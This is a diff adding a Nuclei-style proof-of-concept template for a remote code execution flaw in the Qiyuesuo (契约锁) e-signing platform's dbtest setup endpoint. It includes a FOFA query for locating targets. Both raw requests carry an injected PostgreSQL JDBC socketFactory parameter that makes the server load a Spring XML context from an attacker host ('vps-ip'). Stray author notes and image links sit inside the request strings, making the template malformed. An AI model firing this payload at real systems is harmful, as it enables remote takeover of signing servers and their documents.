@@ -1,0 +1,44 @@
+id: poc-gmxyr03xmw2nr0y3
+info:
+  name: 契约锁dbtest存在远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gmxyr03xmw2nr0y3'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gmxyr03xmw2nr0y3
+    fofa: app=契约锁-电子签署平台
+http:
+- raw:
+  - 'GET /setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fvps-ip%2F1%2Exml HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    有的系统带/api路由'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /api/setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fvps-ip%2F1%2Exml HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    这里使用 Java 的 InetAddress 类触发 DNS 查询进行检测
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1750483610625-b9631f58-3f31-464c-a809-a51fcbbe888b.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1750483610849-45dc8698-8447-4b98-9595-dc6d24d2abcb.png)
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1750483611035-251a4579-2f38-42ae-bef7-2bb0b3e78c97.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
